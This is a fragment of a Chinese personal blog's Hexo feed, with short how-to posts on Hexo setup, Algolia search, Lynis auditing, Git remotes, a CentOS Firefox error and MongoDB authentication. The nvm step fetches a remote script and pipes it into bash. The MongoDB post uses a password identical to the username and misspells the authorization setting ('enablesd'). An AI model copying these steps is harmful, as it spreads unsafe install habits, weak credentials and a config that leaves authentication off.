class="name">%</span> <span class="attr">if</span> (!<span class="attr">index</span> &amp;&amp; <span class="attr">post.toc</span>)&#123; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"show-toc-btn"</span> <span class="attr">id</span>=<span class="string">"show-toc-btn"</span> <span class="attr">onclick</span>=<span class="string">"showToc();"</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"btn-bg"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"btn-text"</span>&gt;</span>文章导航<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"toc-article"</span> <span class="attr">class</span>=<span class="string">"toc-article"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"toc-close"</span> <span class="attr">class</span>=<span class="string">"toc-close"</span> <span class="attr">title</span>=<span class="string">"隐藏导航"</span> <span class="attr">onclick</span>=<span class="string">"showBtn();"</span>&gt;</span>×<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span> <span class="attr">class</span>=<span class="string">"toc-title"</span>&gt;</span>文章目录<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">%-</span> <span class="attr">toc</span>(<span class="attr">post.content</span>) %&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">showToc</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> toc_article = <span class="built_in">document</span>.getElementById(<span class="string">"toc-article"</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> show_toc_btn = <span class="built_in">document</span>.getElementById(<span class="string">"show-toc-btn"</span>);</span></span><br><span class="line"><span class="actionscript">toc_article.setAttribute(<span class="string">"style"</span>,<span class="string">"display:block"</span>);</span></span><br><span class="line"><span class="actionscript">show_toc_btn.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none"</span>);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">showBtn</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> toc_article = <span class="built_in">document</span>.getElementById(<span class="string">"toc-article"</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> show_toc_btn = <span class="built_in">document</span>.getElementById(<span class="string">"show-toc-btn"</span>);</span></span><br><span class="line"><span class="actionscript">toc_article.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none"</span>);</span></span><br><span class="line"><span class="actionscript">show_toc_btn.setAttribute(<span class="string">"style"</span>,<span class="string">"display:block"</span>);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 目录内容结束 --&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="添加目录"><a href="#添加目录" class="headerlink" title="添加目录"></a>添加目录</h3><p>在文章开头添加 <code>toc: true</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;有的文章比较长，翻页查阅比较麻烦，添加文章目录功能&lt;/p&gt;
&lt;h2 id=&quot;0x01-添加文章目录&quot;&gt;&lt;a href=&quot;#0x01-添加文章目录&quot; class=&quot;headerlink&quot; title=&quot;0x01 添加文章目录&quot;&gt;&lt;/a&gt;0x01 添加文章目录&lt;/h2&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="hexo" scheme="http://www.pa55w0rd.club/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>use_algolia_search</title>
    <link href="http://www.pa55w0rd.club/use-algolia-search/"/>
    <id>http://www.pa55w0rd.club/use-algolia-search/</id>
    <published>2018-11-20T06:04:40.000Z</published>
    <updated>2018-11-21T09:09:21.950Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>去<a href="https://www.algolia.com" target="_blank" rel="noopener">algolia</a>官网注册账号</p></li><li><p>新建index索引 Blog</p></li></ol><a id="more"></a><ol start="3"><li>在hex项目下安装 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># npm install hexo-algolia --save</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># export HEXO_ALGOLIA_INDEXING_KEY=xxxxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hexo algolia</span></span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Testing HEXO_ALGOLIA_INDEXING_KEY permissions.</span><br><span class="line"><span class="builtin-name">INFO</span>  Start processing</span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Identified 45 pages <span class="keyword">and</span> posts <span class="keyword">to</span> index.</span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Indexing chunk 1 of 1 (50 items each)</span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Indexing done.</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;&lt;p&gt;去&lt;a href=&quot;https://www.algolia.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;algolia&lt;/a&gt;官网注册账号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;新建index索引 Blog&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="hexo" scheme="http://www.pa55w0rd.club/tags/hexo/"/>
    
      <category term="algolia" scheme="http://www.pa55w0rd.club/tags/algolia/"/>
    
  </entry>
  
  <entry>
    <title>jekyll迁移hexo</title>
    <link href="http://www.pa55w0rd.club/jekyll%E8%BF%81%E7%A7%BBhexo/"/>
    <id>http://www.pa55w0rd.club/jekyll迁移hexo/</id>
    <published>2018-11-19T08:19:09.000Z</published>
    <updated>2018-11-23T07:54:58.359Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><a id="more"></a><h2 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h2><p>操作系统：Windows 10 子系统 Ubuntu 18.04 </p><p>使用apt install nodejs &amp;&amp; apt install npm 安装之后npm不能用</p><p>通过源码安装，npm也不能用</p><p>node还好，npm就是不能用，最后通过nvm安装成功</p><h3 id="安装node-npm"><a href="#安装node-npm" class="headerlink" title="安装node + npm"></a>安装node + npm</h3><ul><li><p>安装nvm</p>  <figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># source ~/.bashrc</span></span><br></pre></td></tr></table></figure></li><li><p>使用nvm</p>  <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># nvm ls-remote   <span class="comment">//列出远程所有可用版本</span></span><br><span class="line"># nvm install <span class="number">10.13</span><span class="number">.0</span> <span class="comment">//目前稳定LTS版</span></span><br><span class="line"># nvm ls <span class="comment">//查看已安装版本</span></span><br><span class="line"># nvm use <span class="number">10.13</span><span class="number">.0</span> <span class="comment">//切换到版本</span></span><br><span class="line"><span class="comment">//如果想把某个版本设为默认，可以这么做：</span></span><br><span class="line"># nvm alias <span class="section">default</span> <span class="number">10.13</span><span class="number">.0</span></span><br><span class="line"># nvm use <span class="section">default</span></span><br></pre></td></tr></table></figure></li><li><p>换源</p><p>  官方源可能会被墙，需要换源</p><p>  使用源管理工具 nrm</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># npm i -g nrm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nrm ls</span></span><br><span class="line"></span><br><span class="line"><span class="string">*</span> <span class="string">npm</span> <span class="bullet">----</span> <span class="attr">https://registry.npmjs.org/</span></span><br><span class="line">  <span class="string">cnpm</span> <span class="meta">---</span> <span class="attr">http://r.cnpmjs.org/</span></span><br><span class="line">  <span class="string">taobao</span> <span class="bullet">-</span> <span class="attr">https://registry.npm.taobao.org/</span></span><br><span class="line">  <span class="string">nj</span> <span class="bullet">-----</span> <span class="attr">https://registry.nodejitsu.com/</span></span><br><span class="line">  <span class="string">rednpm</span> <span class="bullet">-</span> <span class="attr">http://registry.mirror.cqupt.edu.cn/</span></span><br><span class="line">  <span class="string">npmMirror</span>  <span class="attr">https://skimdb.npmjs.com/registry/</span></span><br><span class="line">  <span class="string">edunpm</span> <span class="bullet">-</span> <span class="attr">http://registry.enpmjs.org/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nrm use taobao  //切换淘宝源</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><pre><code><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># apt-get install git</span></span><br></pre></td></tr></table></figure></code></pre><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre><code><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-<span class="keyword">cli</span></span><br></pre></td></tr></table></figure></code></pre><h2 id="0x02-简单使用"><a href="#0x02-简单使用" class="headerlink" title="0x02 简单使用"></a>0x02 简单使用</h2><h3 id="初始化-init"><a href="#初始化-init" class="headerlink" title="初始化 init"></a>初始化 init</h3><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo init &lt;folder&gt;</span></span><br><span class="line"><span class="meta"># cd &lt;folder&gt;</span></span><br><span class="line"><span class="meta"># npm install</span></span><br></pre></td></tr></table></figure></p><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="variable">_config</span>.yml     <span class="comment">//配置信息</span></span><br><span class="line">├── package.json    <span class="comment">//应用程序信息</span></span><br><span class="line">├── scaffolds       <span class="comment">//模板文件夹</span></span><br><span class="line">├── source      <span class="comment">//资源文件夹</span></span><br><span class="line">|   ├── <span class="variable">_drafts</span></span><br><span class="line">|   └── <span class="variable">_posts</span>  <span class="comment">//文章</span></span><br><span class="line">└── themes      <span class="comment">//主题文件夹</span></span><br></pre></td></tr></table></figure><h3 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h3><p>创建 Hexo 主题非常容易，您只要在 themes 文件夹内，新增一个任意名称的文件夹，并修改 _config.yml 内的 theme 设定，即可切换主题。一个主题可能会有以下的结构：<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── languages</span><br><span class="line">├── <span class="keyword">layout</span></span><br><span class="line">├── scripts</span><br><span class="line">└── <span class="keyword">source</span></span><br></pre></td></tr></table></figure></p><p><strong>_config.yml</strong></p><p>主题的配置文件。修改时会自动更新，无需重启服务器。</p><h3 id="新建文章-new"><a href="#新建文章-new" class="headerlink" title="新建文章 new"></a>新建文章 new</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo new [layout] <span class="meta-string">&lt;title&gt;</span></span></span><br></pre></td></tr></table></figure><p>新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p><h3 id="生成静态文件-generate"><a href="#生成静态文件-generate" class="headerlink" title="生成静态文件 generate"></a>生成静态文件 generate</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># hexo <span class="keyword">generate</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>-d, –deploy</td><td>文件生成后立即部署网站</td></tr><tr><td>-w, –watch</td><td>监视文件变动</td></tr></tbody></table><h3 id="启动本地服务器-server"><a href="#启动本地服务器-server" class="headerlink" title="启动本地服务器 server"></a>启动本地服务器 server</h3><p>hexo3.0 把服务器独立成单独的模块，需要先安装才能使用<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># npm install hexo-server --save</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># hexo server</span></span><br></pre></td></tr></table></figure></p><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>-p, –port</td><td>重设端口</td></tr><tr><td>-s, –static</td><td>只使用静态文件</td></tr><tr><td>-l, –log</td><td>启动日记记录，使用覆盖记录格式</td></tr></tbody></table><h3 id="部署-deploy"><a href="#部署-deploy" class="headerlink" title="部署 deploy"></a>部署 deploy</h3><p>Hexo 提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。</p><p>先安装<code>hexo-deployer-git</code>模块</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># npm install hexo-deployer-git --save</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># hexo deploy</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-g, –generate</td><td>部署之前预先生成静态文件</td></tr></tbody></table><p>在 <code>_config.yml</code> 中修改参数，可以同时使用多个deployer<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line">  <span class="attribute">type</span>: git</span><br><span class="line">  <span class="attribute">message</span>: <span class="string">"Update My Blog"</span></span><br><span class="line">  <span class="attribute">branch</span>: master</span><br><span class="line">  <span class="attribute">repository</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:Pa55w0rd/pa55w0rd-new.github.io.git</span><br></pre></td></tr></table></figure></p><h3 id="清除-clean"><a href="#清除-clean" class="headerlink" title="清除 clean"></a>清除 clean</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo clean</span></span><br></pre></td></tr></table></figure><h3 id="命令简写"><a href="#命令简写" class="headerlink" title="命令简写"></a>命令简写</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo g</span></span><br><span class="line"><span class="meta"># hexo s</span></span><br><span class="line"><span class="meta"># hexo d</span></span><br></pre></td></tr></table></figure><h2 id="0x03-jekyll-迁移至hexo"><a href="#0x03-jekyll-迁移至hexo" class="headerlink" title="0x03 jekyll 迁移至hexo"></a>0x03 jekyll 迁移至hexo</h2><p>把<code>_posts</code>文件夹内的所有文件复制到<code>source/_posts</code> 文件夹，并在<code>_config.yml</code>中修改 <code>new_post_name</code>参数。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">new_post_name:</span> <span class="symbol">:year-</span><span class="symbol">:month-</span><span class="symbol">:day-</span><span class="symbol">:title</span>.md</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="hexo" scheme="http://www.pa55w0rd.club/tags/hexo/"/>
    
      <category term="迁移" scheme="http://www.pa55w0rd.club/tags/%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
  <entry>
    <title>Lynis + ansible</title>
    <link href="http://www.pa55w0rd.club/lynis/"/>
    <id>http://www.pa55w0rd.club/lynis/</id>
    <published>2018-11-16T07:57:42.000Z</published>
    <updated>2018-12-03T09:36:52.536Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="git clone https://github.com/CISOfy/lynis">项目地址</a></p></blockquote><p>Lynis是一款面向Linux、Mac OS X、BSD以及Solaris等Unix类系统的安全审计与强化工具。它能够深入扫描并检测系统中的问题、存在漏洞的软件包以及配置设置，并提出相关解决建议。Lynis能够轻松实现安全评估、合规性测试、漏洞检测、配置管理以及补丁管理。 </p><a id="more"></a><p><strong>安装使用</strong><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CISOfy/</span>lynis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">lynis audit system</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置定时任务，如每天3点运行扫描，并将报告发送电子邮件地址</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span> <span class="number">3</span> * * * <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>lynis --quick <span class="number">2</span>&gt;&amp;<span class="number">1</span> | mail -s <span class="string">"Lynis Reports of My Server"</span> you@yourdomain.com</span><br></pre></td></tr></table></figure></p><p>ansible</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;git clone https://github.com/CISOfy/lynis&quot;&gt;项目地址&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Lynis是一款面向Linux、Mac OS X、BSD以及Solaris等Unix类系统的安全审计与强化工具。它能够深入扫描并检测系统中的问题、存在漏洞的软件包以及配置设置，并提出相关解决建议。Lynis能够轻松实现安全评估、合规性测试、漏洞检测、配置管理以及补丁管理。 &lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
  </entry>
  
  <entry>
    <title>Git修改远程URL</title>
    <link href="http://www.pa55w0rd.club/git_edit_remoteurl/"/>
    <id>http://www.pa55w0rd.club/git_edit_remoteurl/</id>
    <published>2018-11-06T09:04:11.000Z</published>
    <updated>2018-11-21T11:29:09.780Z</updated>
    
    <content type="html"><![CDATA[<p>Github 设置使用了ssh key，每次提交代码还是需要输入用户名？？？</p><a id="more"></a><p>检查发现，在设置远程url的时候使用了https</p><p><a href="https://github.com/Pa55w0rd/pa55w0rd.github.io.git" target="_blank" rel="noopener">https://github.com/Pa55w0rd/pa55w0rd.github.io.git</a></p><p>使用git remote set-url命令从https切换到ssh<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># git remote <span class="keyword">set</span>-url <span class="comment">origin git+ssh:</span>//<span class="comment">git@github.com</span>/Pa55w0rd/<span class="comment">pa55w0rd.github.io.git</span></span><br></pre></td></tr></table></figure></p><p>通过git remote -v命令验证是否成功<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git remote -v</span></span><br><span class="line"><span class="attribute">origin</span>  git+ssh://git<span class="variable">@github</span>.com/Pa55w0rd/pa55w0rd.github.io.git (fetch)</span><br><span class="line">origin  git+ssh://git<span class="variable">@github</span>.com/Pa55w0rd/pa55w0rd.github.io.git (push)</span><br></pre></td></tr></table></figure></p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="建立远程仓库"><a href="#建立远程仓库" class="headerlink" title="建立远程仓库"></a>建立远程仓库</h3><p>进入GitHub，点击右上角 + 号，选择New repository</p><p>输入仓库名称，点击 Create repository</p><h3 id="建立本地仓库"><a href="#建立本地仓库" class="headerlink" title="建立本地仓库"></a>建立本地仓库</h3><p>建立目录，将文件夹初始化为git可以管理的仓库</p><p>git init</p><h3 id="与远程仓库关联"><a href="#与远程仓库关联" class="headerlink" title="与远程仓库关联"></a>与远程仓库关联</h3><p>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:Pa55w0rd/pa55w0rd.github.io.git</p><h3 id="添加到暂存区"><a href="#添加到暂存区" class="headerlink" title="添加到暂存区"></a>添加到暂存区</h3><p>git add .   </p><blockquote><p>注意最后边的 .</p></blockquote><h3 id="提交暂存区到仓库区"><a href="#提交暂存区到仓库区" class="headerlink" title="提交暂存区到仓库区"></a>提交暂存区到仓库区</h3><p>git commit -m “init”</p><h3 id="上传本地仓库到远程仓库"><a href="#上传本地仓库到远程仓库" class="headerlink" title="上传本地仓库到远程仓库"></a>上传本地仓库到远程仓库</h3><p>git push origin master</p><h3 id="显示变更的文件"><a href="#显示变更的文件" class="headerlink" title="显示变更的文件"></a>显示变更的文件</h3><p>git status</p><h3 id="克隆远程仓库到本地"><a href="#克隆远程仓库到本地" class="headerlink" title="克隆远程仓库到本地"></a>克隆远程仓库到本地</h3><p>git clone <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:Pa55w0rd/pa55w0rd.github.io.git</p><h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><p>参考 <a href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="noopener">阮一峰_ 常用Git命令清单</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Github 设置使用了ssh key，每次提交代码还是需要输入用户名？？？&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="解决方法" scheme="http://www.pa55w0rd.club/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Centos 7 运行firefox出错</title>
    <link href="http://www.pa55w0rd.club/linux_firefox_error/"/>
    <id>http://www.pa55w0rd.club/linux_firefox_error/</id>
    <published>2018-11-06T09:03:11.000Z</published>
    <updated>2018-11-21T11:29:18.378Z</updated>
    
    <content type="html"><![CDATA[<p>Centos 7 在firefox官网下载了最新的安装包，运行后提示</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># firefox</span><br><span class="line">XPCOMGlueLoad <span class="keyword">error</span> <span class="keyword">for</span> <span class="keyword">file</span> /root/fuzzingbox/firefox/libmozgtk.<span class="keyword">so</span>:</span><br><span class="line">libgtk-3.<span class="keyword">so</span>.0: cannot <span class="keyword">open</span> shared object <span class="keyword">file</span>: <span class="keyword">No</span> such <span class="keyword">file</span> or directory</span><br><span class="line">Couldn't load XPCOM.</span><br></pre></td></tr></table></figure><a id="more"></a><p>提示缺少libgtk-3.so库<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> gtk3</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Centos 7 在firefox官网下载了最新的安装包，运行后提示&lt;/p&gt;
&lt;figure class=&quot;highlight stata&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# firefox&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;XPCOMGlueLoad &lt;span class=&quot;keyword&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;file&lt;/span&gt; /root/fuzzingbox/firefox/libmozgtk.&lt;span class=&quot;keyword&quot;&gt;so&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;libgtk-3.&lt;span class=&quot;keyword&quot;&gt;so&lt;/span&gt;.0: cannot &lt;span class=&quot;keyword&quot;&gt;open&lt;/span&gt; shared object &lt;span class=&quot;keyword&quot;&gt;file&lt;/span&gt;: &lt;span class=&quot;keyword&quot;&gt;No&lt;/span&gt; such &lt;span class=&quot;keyword&quot;&gt;file&lt;/span&gt; or directory&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Couldn&#39;t load XPCOM.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="解决方法" scheme="http://www.pa55w0rd.club/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>mongodb开启认证</title>
    <link href="http://www.pa55w0rd.club/mongodb_auth/"/>
    <id>http://www.pa55w0rd.club/mongodb_auth/</id>
    <published>2018-11-01T05:35:11.000Z</published>
    <updated>2018-11-23T07:55:59.876Z</updated>
    
    <content type="html"><![CDATA[<p>修改配置文件，开启认证</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># vi /etc/mongod.conf</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">    security:</span></span><br><span class="line"><span class="symbol">    authorization:</span>enablesd</span><br></pre></td></tr></table></figure><a id="more"></a><p>创建密码</p><ul><li><strong>db.createUser({ user: “w11scan”, pwd: “w11scan”, roles: [{ role: “dbOwner”, db: “w11scan_config” }] })</strong>  <br>mongo创建db密码</li><li><strong>db.auth(“useradmin”, “adminpassword”)</strong> <br>验证，1表示成功<br>mongodb中的用户是基于身份role的<ul><li>管理员账户的 role是 userAdminAnyDatabase，‘userAdmin’代表用户管理身份，’AnyDatabase’ 代表可以管理任何数据库。</li><li>dbOwner 代表数据库所有者角色，拥有最高该数据库最高权限。比如新建索引等</li><li>readWrite 该用户用于该数据的读写，只拥有读写权限。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
